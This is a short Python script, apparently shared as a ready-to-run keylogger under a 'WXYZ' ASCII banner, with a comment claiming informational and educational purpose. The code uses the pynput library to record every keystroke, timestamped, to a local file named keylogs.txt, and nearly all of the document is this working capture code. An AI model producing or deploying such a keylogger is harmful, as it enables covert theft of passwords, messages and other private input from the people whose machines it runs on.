# import library pynput1.7.4
# import library logging2 0.1.2
# use this tool informational and eductional purpose
# made with collaboration of WXYZ

print("""

888       888Y88b   d88PY88b   d88P8888888888P 
888   o   888 Y88b d88P  Y88b d88P       d88P  
888  d8b  888  Y88o88P    Y88o88P       d88P   
888 d888b 888   Y888P      Y888P       d88P    
888d88888b888   d888b       888       d88P     
88888P Y88888  d88888b      888      d88P      
8888P   Y8888 d88P Y88b     888     d88P       
888P     Y888d88P   Y88b    888    d8888888888 
                                               
                      

 """)


from pynput.keyboard import Key, Listener
import logging

log_dir = ""

logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
	level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
